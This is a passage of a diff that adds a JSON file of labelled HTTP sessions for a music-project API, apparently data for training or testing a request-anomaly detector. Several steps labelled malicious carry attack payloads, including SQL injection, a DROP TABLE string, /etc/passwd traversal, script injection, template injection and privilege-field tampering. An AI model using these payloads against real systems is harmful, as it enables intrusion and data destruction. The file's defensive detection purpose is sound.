@@ -1,0 +1,5955 @@
+[
+  {
+    "session_id": "sess001",
+    "client_ip": "192.168.1.10",
+    "steps": [
+      {
+        "id": "sess001-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer01@example.com",
+          "password": "SecurePassword123!"
+        },
+        "note": "The designer authenticates to obtain an access token."
+      },
+      {
+        "id": "sess001-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {
+          "limit": 10
+        },
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The designer retrieves the list of their pressing projects."
+      },
+      {
+        "id": "sess001-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-alpha-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The designer checks the details of the primary project proj-alpha-01."
+      },
+      {
+        "id": "sess001-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-beta-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The designer checks a secondary project proj-beta-02 they also own."
+      },
+      {
+        "id": "sess001-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-alpha-01/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1Ni..."
+        },
+        "body": null,
+        "note": "The designer lists all tracks associated with the primary project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess002",
+    "client_ip": "10.0.0.15",
+    "steps": [
+      {
+        "id": "sess002-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        },
+        "body": null,
+        "note": "The client checks system status using a legacy outdated browser header."
+      },
+      {
+        "id": "sess002-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer02@example.com",
+          "password": "Password456!"
+        },
+        "note": "The designer logs into their account."
+      },
+      {
+        "id": "sess002-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer tokenXYZ789"
+        },
+        "body": null,
+        "note": "The designer views their project list."
+      },
+      {
+        "id": "sess002-s04",
+        "label": "benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer tokenXYZ789",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Summer EP",
+          "description": "Limited edition vinyl release"
+        },
+        "note": "The designer creates a new project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess003",
+    "client_ip": "172.16.254.1",
+    "steps": [
+      {
+        "id": "sess003-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer tokenMalicious1",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Project' OR 1=1 --",
+          "description": "Query injection attempt in title field."
+        },
+        "note": "The client attempts a query injection attack inside the project creation title."
+      },
+      {
+        "id": "sess003-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system status following the attempt."
+      },
+      {
+        "id": "sess003-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user03@example.com",
+          "password": "ValidPassword!"
+        },
+        "note": "The user logs in normally."
+      },
+      {
+        "id": "sess003-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token03"
+        },
+        "body": null,
+        "note": "The user lists their projects."
+      }
+    ]
+  },
+  {
+    "session_id": "sess004",
+    "client_ip": "192.168.2.55",
+    "steps": [
+      {
+        "id": "sess004-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer04@example.com",
+          "password": "PassWord04!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess004-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token04"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess004-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token04",
+          "X-Debug-Mode": "true\nAdditional sentence continuation for logs."
+        },
+        "body": null,
+        "note": "The client includes a newline continuing a sentence inside a custom header field."
+      },
+      {
+        "id": "sess004-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-04/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token04"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess005",
+    "client_ip": "10.10.10.10",
+    "steps": [
+      {
+        "id": "sess005-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer05@example.com",
+          "password": "Password05!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess005-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token05"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess005-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-unauthorized-999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token05"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+      },
+      {
+        "id": "sess005-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-myown-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token05"
+        },
+        "body": null,
+        "note": "The designer returns to viewing their own project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess006",
+    "client_ip": "192.168.5.12",
+    "steps": [
+      {
+        "id": "sess006-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer06@example.com",
+          "password": "Password06!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess006-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token06"
+        },
+        "body": null,
+        "note": "The designer lists their projects."
+      },
+      {
+        "id": "sess006-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token06",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Acoustic Session",
+          "description": "Standard album release",
+          "harmless_extra_field": "metadata_tag_value"
+        },
+        "note": "The client includes a harmless extra field in the creation request."
+      },
+      {
+        "id": "sess006-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-06",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token06"
+        },
+        "body": null,
+        "note": "The designer views the project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess007",
+    "client_ip": "10.20.30.40",
+    "steps": [
+      {
+        "id": "sess007-s01",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj-07",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token07",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Updated Title",
+          "is_admin": true
+        },
+        "note": "The client submits an unauthorized privilege elevation field."
+      },
+      {
+        "id": "sess007-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer07@example.com",
+          "password": "Password07!"
+        },
+        "note": "The designer logs in after the test."
+      },
+      {
+        "id": "sess007-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token07"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess007-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess008",
+    "client_ip": "192.168.10.5",
+    "steps": [
+      {
+        "id": "sess008-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer08@example.com",
+          "password": "Password08!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess008-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token08"
+        },
+        "body": null,
+        "note": "The designer retrieves projects."
+      },
+      {
+        "id": "sess008-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-08/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token08",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Intro' Track",
+          "durationSeconds": 120
+        },
+        "note": "The client includes an apostrophe character inside a track name."
+      },
+      {
+        "id": "sess008-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-08/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token08"
+        },
+        "body": null,
+        "note": "The designer lists project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess009",
+    "client_ip": "172.20.10.50",
+    "steps": [
+      {
+        "id": "sess009-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer09@example.com",
+          "password": "Password09!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess009-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token09"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via the path parameter."
+      },
+      {
+        "id": "sess009-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token09"
+        },
+        "body": null,
+        "note": "The designer resumes standard project listing."
+      },
+      {
+        "id": "sess009-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-09",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token09"
+        },
+        "body": null,
+        "note": "The designer checks specific project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess010",
+    "client_ip": "10.0.5.22",
+    "steps": [
+      {
+        "id": "sess010-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer10@example.com",
+          "password": "Password10!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess010-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token10",
+          "X-Reference-Note": "Referencing a directory traversal vulnerability conceptually in notes."
+        },
+        "body": null,
+        "note": "The client mentions a technical word in a request header."
+      },
+      {
+        "id": "sess010-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-10",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token10"
+        },
+        "body": null,
+        "note": "The designer checks project details."
+      },
+      {
+        "id": "sess010-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-10/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token10"
+        },
+        "body": null,
+        "note": "The designer lists tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess011",
+    "client_ip": "192.168.1.50",
+    "steps": [
+      {
+        "id": "sess011-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer11@example.com",
+          "password": "Password11!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess011-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token11"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess011-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-11/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token11",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<script>alert(1)</script>"
+        },
+        "note": "The client attempts browser-executed code injection inside note content."
+      },
+      {
+        "id": "sess011-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-11/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token11"
+        },
+        "body": null,
+        "note": "The designer lists notes for the track."
+      }
+    ]
+  },
+  {
+    "session_id": "sess012",
+    "client_ip": "10.1.1.88",
+    "steps": [
+      {
+        "id": "sess012-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer12@example.com",
+          "password": "Password12!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess012-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token12"
+        },
+        "body": null,
+        "note": "The designer retrieves projects."
+      },
+      {
+        "id": "sess012-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token12",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "LP Release",
+          "description": "Master audio tracks"
+        },
+        "note": "The designer creates a new project."
+      },
+      {
+        "id": "sess012-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 4.0; WOW64)"
+        },
+        "body": null,
+        "note": "The client accesses the system status using an extremely old legacy browser agent."
+      }
+    ]
+  },
+  {
+    "session_id": "sess013",
+    "client_ip": "172.16.10.2",
+    "steps": [
+      {
+        "id": "sess013-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Webhook Trigger",
+          "description": "http://127.0.0.1:8080/internal"
+        },
+        "note": "The client injects an internal address reference inside the description field."
+      },
+      {
+        "id": "sess013-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess013-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-13",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13"
+        },
+        "body": null,
+        "note": "The designer views project details."
+      },
+      {
+        "id": "sess013-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-13/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token13"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess014",
+    "client_ip": "192.168.3.44",
+    "steps": [
+      {
+        "id": "sess014-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer14@example.com",
+          "password": "Password14!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess014-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess014-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-14/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Side A Interlude'\nContinuing sentence on next line.",
+          "durationSeconds": 90
+        },
+        "note": "The client includes an apostrophe and a newline continuing a sentence in track name."
+      },
+      {
+        "id": "sess014-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-14/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token14"
+        },
+        "body": null,
+        "note": "The designer views the track list."
+      }
+    ]
+  },
+  {
+    "session_id": "sess015",
+    "client_ip": "10.50.100.5",
+    "steps": [
+      {
+        "id": "sess015-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer15@example.com",
+          "password": "Password15!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess015-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token15"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess015-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token15",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "{{7*7}}",
+          "description": "Template expression test"
+        },
+        "note": "The client injects a template expression string into the project title."
+      },
+      {
+        "id": "sess015-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-15",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token15"
+        },
+        "body": null,
+        "note": "The designer checks project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess016",
+    "client_ip": "192.168.7.88",
+    "steps": [
+      {
+        "id": "sess016-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer16@example.com",
+          "password": "Password16!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess016-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token16"
+        },
+        "body": null,
+        "note": "The designer views projects."
+      },
+      {
+        "id": "sess016-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-16",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token16"
+        },
+        "body": null,
+        "note": "The designer views project 16."
+      },
+      {
+        "id": "sess016-s04",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-16/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token16",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Bonus Track",
+          "durationSeconds": 180,
+          "extra_note_field": "Harmless metadata string attached."
+        },
+        "note": "The client adds a harmless extra field to the track creation body."
+      }
+    ]
+  },
+  {
+    "session_id": "sess017",
+    "client_ip": "172.30.15.22",
+    "steps": [
+      {
+        "id": "sess017-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token17",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SerializedPayload",
+          "description": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaBNhcA..."
+        },
+        "note": "The client submits a serialized object payload in the description field."
+      },
+      {
+        "id": "sess017-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer17@example.com",
+          "password": "Password17!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess017-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token17"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess017-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess018",
+    "client_ip": "10.0.2.15",
+    "steps": [
+      {
+        "id": "sess018-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer18@example.com",
+          "password": "Password18!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess018-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token18"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess018-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj-18/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token18",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Normal Track\n[2026-03-30 12:00:00] ADMIN_LOG_STAMP",
+          "durationSeconds": 200
+        },
+        "note": "The client injects a newline plus a log stamp inside the track name."
+      },
+      {
+        "id": "sess018-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-18/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token18"
+        },
+        "body": null,
+        "note": "The designer lists tracks for project 18."
+      }
+    ]
+  },
+  {
+    "session_id": "sess019",
+    "client_ip": "192.168.100.2",
+    "steps": [
+      {
+        "id": "sess019-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer19@example.com",
+          "password": "Password19!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess019-s02",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token19",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Vinyl Master's Edition",
+          "description": "Standard release"
+        },
+        "note": "The client uses an apostrophe in the project title."
+      },
+      {
+        "id": "sess019-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token19"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess019-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-19",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token19"
+        },
+        "body": null,
+        "note": "The designer checks project 19 details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess020",
+    "client_ip": "10.10.20.30",
+    "steps": [
+      {
+        "id": "sess020-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer20@example.com",
+          "password": "Password20!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess020-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token20"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess020-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-20",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token20"
+        },
+        "body": null,
+        "note": "The designer views project 20."
+      },
+      {
+        "id": "sess020-s04",
+        "suspicious_benign": true,
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-20/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token20",
+          "X-Notes": "Mentioning query injection concept casually."
+        },
+        "body": null,
+        "note": "The client mentions a technical attack term in a header."
+      }
+    ]
+  },
+  {
+    "session_id": "sess021",
+    "client_ip": "192.168.15.20",
+    "steps": [
+      {
+        "id": "sess021-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer21@example.com",
+          "password": "Password21!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess021-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token21"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess021-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token21",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Retro Beats",
+          "description": "Synthwave album"
+        },
+        "note": "The designer creates a new project."
+      },
+      {
+        "id": "sess021-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-21-secondary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token21"
+        },
+        "body": null,
+        "note": "The designer checks a second owned project ID in the workflow."
+      }
+    ]
+  },
+  {
+    "session_id": "sess022",
+    "client_ip": "172.25.10.15",
+    "steps": [
+      {
+        "id": "sess022-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/register",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Custom-Info": "User registration\ncontinuing on next line."
+        },
+        "body": {
+          "email": "newdesigner22@example.com",
+          "password": "StrongPassword22!"
+        },
+        "note": "The user registers with a header containing a newline continuation."
+      },
+      {
+        "id": "sess022-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "newdesigner22@example.com",
+          "password": "StrongPassword22!"
+        },
+        "note": "The new designer logs in."
+      },
+      {
+        "id": "sess022-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token22"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess022-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess023",
+    "client_ip": "10.2.3.4",
+    "steps": [
+      {
+        "id": "sess023-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer23@example.com",
+          "password": "Password23!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess023-s02",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token23",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SQL Test",
+          "description": "'; DROP TABLE projects; --"
+        },
+        "note": "The client injects a SQL query string into the project description."
+      },
+      {
+        "id": "sess023-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token23"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess023-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system status."
+      }
+    ]
+  },
+  {
+    "session_id": "sess024",
+    "client_ip": "192.168.4.15",
+    "steps": [
+      {
+        "id": "sess024-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer24@example.com",
+          "password": "Password24!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess024-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token24"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess024-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token24",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Indie Folk",
+          "description": "Acoustic album",
+          "client_version": "1.0.0-beta"
+        },
+        "note": "The client adds a harmless extra metadata field to the request."
+      },
+      {
+        "id": "sess024-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-24",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token24"
+        },
+        "body": null,
+        "note": "The designer views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess025",
+    "client_ip": "172.18.5.50",
+    "steps": [
+      {
+        "id": "sess025-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer25@example.com",
+          "password": "Password25!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess025-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token25"
